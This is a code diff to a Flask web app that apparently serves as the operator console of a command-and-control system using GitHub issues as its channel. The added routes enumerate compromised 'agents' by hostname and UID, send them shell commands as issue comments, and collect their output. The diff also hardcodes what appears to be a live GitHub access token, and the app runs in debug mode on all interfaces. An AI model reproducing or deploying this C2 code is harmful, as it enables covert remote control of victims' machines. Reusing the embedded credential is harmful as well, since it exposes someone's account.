@@ -1,88 +1,92 @@
 from flask import Flask, request, jsonify, render_template
-from flask_cors import CORS
 import requests
-import time
 
 app = Flask(__name__)
-CORS(app)
 
 # GitHub settings
-GITHUB_TOKEN = ""
-GITHUB_REPO = "" #Username/repo
-
+GITHUB_TOKEN = "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"
+GITHUB_REPO = "CaptShiva007/C2-Channel"
 HEADERS = {
     "Authorization": f"token {GITHUB_TOKEN}",
     "Accept": "application/vnd.github.v3+json"
 }
 
-# Stores issued commands and their responses
-command_history = []
-
 @app.route('/')
 def index():
     return render_template("index.html")
 
+@app.route('/agents', methods=['GET'])
+def get_agents():
+    response = requests.get(f"https://api.github.com/repos/{GITHUB_REPO}/issues", headers=HEADERS)
+    
+    if response.status_code == 200:
+        issues = response.json()
+        agents = []
+        for issue in issues:
+            if "Agent Registered:" in issue["title"]:
+                parts = issue["title"].split(" | ")
+                if len(parts) == 2:
+                    hostname = parts[0].replace("Agent Registered: ", "").strip()
+                    uid = parts[1].strip()
+                    agents.append({"id": issue["number"], "hostname": hostname, "uid": uid})
+        return jsonify(agents)
+    return jsonify([]), 500
+
+@app.route('/agent/<int:agent_id>', methods=['GET'])
+def get_agent_details(agent_id):
+    response = requests.get(f"https://api.github.com/repos/{GITHUB_REPO}/issues/{agent_id}", headers=HEADERS)
+    if response.status_code == 200:
+        issue = response.json()
+        return jsonify({
+            "hostname": issue["title"].split(" | ")[0],
+            "id": issue["number"],
+            "os": "Windows"  # Assuming Windows based on agent.go implementation
+        })
+    return jsonify({"error": "Agent not found"}), 404
+
+@app.route('/history', methods=['GET'])
+def get_history():
+    agent_id = request.args.get('agent_id')
+    if not agent_id:
+        return jsonify([])
+    
+    response = requests.get(
+        f"https://api.github.com/repos/{GITHUB_REPO}/issues/{agent_id}/comments",
+        headers=HEADERS
+    )
+    
+    history = []
+    if response.status_code == 200:
+        comments = response.json()
+        for comment in comments:
+            body = comment.get("body", "")
+            if body.startswith("Command: "):
+                command = body[len("Command: "):].strip()
+                history.append({"command": command, "output": "Pending..."})
+            elif "```" in body:
+                output = body.strip('```\n').strip()
+                if history:
+                    history[-1]["output"] = output
+    return jsonify(history)
+
 @app.route('/submit', methods=['POST'])
 def submit():
     data = request.get_json()
-    command = data.get("message", "").strip()
+    agent_id = data.get("agent")
+    command = data.get("message")
 
-    if not command:
-        return jsonify({"error": "No command received"}), 400
+    if not agent_id or not command:
+        return jsonify({"error": "Invalid request"}), 400
 
-    if command == "clear_terminal":  # Custom clear command (won't be sent to GitHub)
-        command_history.clear()
-        return jsonify({"success": "Terminal cleared"}), 200
-
-    # Create a GitHub Issue for the command
-    issue_data = {
-        "title": f"Command: {command}",
-        "body": "Execute this command and return output.",
-        "labels": ["command"]
-    }
     response = requests.post(
-        f"https://api.github.com/repos/{GITHUB_REPO}/issues",
-        json=issue_data,
+        f"https://api.github.com/repos/{GITHUB_REPO}/issues/{agent_id}/comments",
+        json={"body": f"Command: {command}"},
         headers=HEADERS
     )
 
     if response.status_code == 201:
-        issue_number = response.json().get("number")
-        command_history.append({
-            "command": command,
-            "output": "Waiting for response...",
-            "issue_number": issue_number
-        })
         return jsonify({"success": "Command submitted"}), 200
-    else:
-        return jsonify({"error": "Failed to create GitHub issue", "details": response.text}), 500
-
-@app.route('/history', methods=['GET'])
-def history():
-    updated_history = []
-
-    for entry in command_history:
-        issue_number = entry["issue_number"]
-        command = entry["command"]
-        response_text = entry["output"]
-
-        if response_text == "Waiting for response...":
-            comments_url = f"https://api.github.com/repos/{GITHUB_REPO}/issues/{issue_number}/comments"
-            comments_response = requests.get(comments_url, headers=HEADERS)
-
-            if comments_response.status_code == 200:
-                comments = comments_response.json()
-                if comments:
-                    latest_comment = comments[-1]["body"].strip()
-                    cleaned_output = latest_comment.replace("```", "").strip()  # Remove Markdown formatting
-                    response_text = cleaned_output
-
-        updated_history.append({
-            "command": command,
-            "output": response_text
-        })
-
-    return jsonify(updated_history)
+    return jsonify({"error": "Failed to send command"}), 500
 
 if __name__ == '__main__':
     app.run(debug=True, host='0.0.0.0', port=5000)
